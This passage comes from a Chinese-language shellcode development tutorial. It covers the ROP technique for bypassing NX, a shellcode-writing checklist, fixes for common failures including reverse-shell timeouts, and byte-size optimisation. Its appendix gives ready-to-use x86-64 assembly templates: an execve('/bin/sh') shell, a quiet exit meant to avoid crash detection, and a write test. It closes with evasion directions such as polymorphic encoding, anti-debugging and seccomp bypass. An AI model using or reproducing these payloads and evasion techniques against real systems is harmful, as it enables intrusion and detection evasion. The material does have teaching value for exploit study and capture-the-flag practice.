│ Stack Canary       │ 栈保护值，检测栈缓冲区溢出              │
│ PIE                 │ 程序本身地址随机化                      │
│ RELRO              │ GOT表只读，防止GOT覆写                  │
│ seccomp            │ 限制可使用的syscall                     │
│ SELinux/AppArmor   │ 强制访问控制，限制进程行为               │
│ Landlock           │ 文件系统访问限制                        │
└────────────────────┴────────────────────────────────────────┘
```

#### 绕过NX/DEP的ROP技术

当栈不可执行时，不能直接执行Shellcode，需要使用ROP（Return-Oriented Programming）：

```text
传统Shellcode注入：
  [缓冲区溢出] → [控制EIP] → [跳转到栈上Shellcode] → 执行
  ↓ 被NX阻止

ROP绕过：
  [缓冲区溢出] → [控制EIP] → [链式执行已有代码片段(gadgets)]
                  → 最终调用mprotect标记栈可执行
                  → 跳转到Shellcode执行
```

### Shellcode开发最佳实践

#### 开发流程检查清单

```text
Shellcode开发10步检查清单：
□ 1. 确认目标架构（x86/x86-64/ARM/MIPS）
□ 2. 确认目标OS和syscall约定
□ 3. 确认约束条件（零字节、字符集、长度限制）
□ 4. 编写汇编源码，避免零字节
□ 5. nasm编译，objdump反汇编验证
□ 6. 提取原始字节码，检查长度
□ 7. 用pwntools验证无零字节
□ 8. 本地GDB单步调试确认逻辑
□ 9. 用目标程序端到端测试
□ 10. 记录Shellcode元数据（架构、长度、功能、约束）
```

#### 常见错误与解决方案

| 错误 | 现象 | 原因 | 解决方案 |
|------|------|------|----------|
| 零字节截断 | Shellcode执行不完整 | `mov`指令生成零字节 | 用`xor`+`push`/`pop`替代 |
| 段错误(SIGSEGV) | 进程崩溃 | 访问未映射内存 | 检查栈指针和地址计算 |
| 连接超时 | 反弹Shell无响应 | IP/端口字节序错误 | 确认小端序，用`htons()`计算 |
| 权限拒绝 | `execve`返回EACCES | SUID位或SELinux限制 | 检查目标文件权限和安全上下文 |
| 命令执行无输出 | 命令跑了但没看到结果 | 未重定向stderr | 确保`dup2`覆盖了fd 0,1,2 |
| 长度超标 | 缓冲区溢出覆盖关键数据 | Shellcode过长 | 精简代码或使用Stager |
| SIGILL(非法指令) | 执行到错误的指令 | 地址计算错误，执行了数据段 | 用GDB检查RIP指向的指令 |
| 架构不匹配 | 行为完全错误 | x86代码在x86-64上运行 | 确认`context.arch`设置正确 |

#### Shellcode长度优化技巧

```asm
; 优化前（冗余写法）：
mov rdi, 1              ; 7字节
mov rsi, rsp            ; 3字节
mov rdx, rax            ; 3字节
mov rax, 1              ; 7字节
syscall                 ; 2字节
; 总计: 22字节

; 优化后（紧凑写法）：
xor edi, edi            ; 2字节（利用32位清零隐含64位清零）
inc edi                 ; 2字节（rdi=1，比mov短5字节）
mov rsi, rsp            ; 3字节
xchg rdx, rax           ; 2字节（交换比mov短1字节，且同时设置rax=原rdx值）
push 1                  ; 2字节
pop rax                 ; 1字节
syscall                 ; 2字节
; 总计: 14字节（节省36%）

; 进一步优化——复用寄存器值：
; 如果之前rax已经是某个有用值，可以通过xchg/inc/dec调整，避免重新加载
```

### 附录：常用Shellcode模板

以下是几个经过测试的Shellcode模板，可直接使用或作为起点修改。

#### 模板1：最小execve("/bin/sh")

```asm
; 长度: 27字节
; 功能: 执行 /bin/sh
; 约束: 无零字节

section .text
global _start
_start:
    xor    rsi, rsi
    push   rsi
    mov    rax, 0x68732f6e69622f
    push   rax
    mov    rdi, rsp
    xor    rdx, rdx
    push   59
    pop    rax
    syscall
```

#### 模板2：exit(0) 安全退出

```asm
; 长度: 8字节
; 功能: 正常退出，返回码0
; 用途: Shellcode执行完敏感操作后干净退出，避免crash被检测

section .text
global _start
_start:
    xor    edi, edi        ; exit code = 0
    push   60
    pop    rax
    syscall
```

#### 模板3：write(1, "message", len)

```asm
; 长度: ~30字节
; 功能: 向stdout写入消息
; 用途: 验证Shellcode执行成功

section .text
global _start
_start:
    jmp    get_msg
write:
    pop    rsi              ; 消息地址
    xor    edi, edi
    inc    edi              ; fd = 1 (stdout)
    push   14
    pop    rdx              ; 长度
    push   1
    pop    rax              ; syscall: write
    syscall

    ; exit(0)
    xor    edi, edi
    push   60
    pop    rax
    syscall

get_msg:
    call   write
    msg: db "Shellcode OK!", 0x0a
```

### 进阶方向

Shellcode开发是一个深不见底的领域，以下是值得深入研究的方向：

**1. 多架构Shellcode开发**：ARM（Android/IoT设备）、MIPS（路由器）、RISC-V（新兴架构）各有不同的syscall约定和寄存器布局。

**2. 自适应Shellcode（Egghunter）**：在大内存空间中搜索标记（egg），然后跳转到紧随其后的Shellcode执行。适用于只能溢出少量字节但可以将Shellcode放在内存某处的场景。

**3. 反调试Shellcode**：检测调试器（如检查`/proc/self/status`的`TracerPid`、使用`ptrace`自调试反调试、时间检测），增加分析难度。

**4. Shikata-Ga-Nai多态编码**：Metasploit最著名的编码器，使用XOR+FNSTENV+动态密钥+随机nop sled实现每次编码结果都不同。

**5. 内存中Shellcode生成**：不使用硬编码字节，而是在运行时通过算术运算和栈操作动态构造Shellcode，彻底避免静态特征匹配。

**6. seccomp-bypass Shellcode**：在有seccomp沙箱限制的环境中，寻找被允许的syscall组合来完成目标操作（如利用`openat`+`read`+`write`绕过`execve`被禁止的限制）。
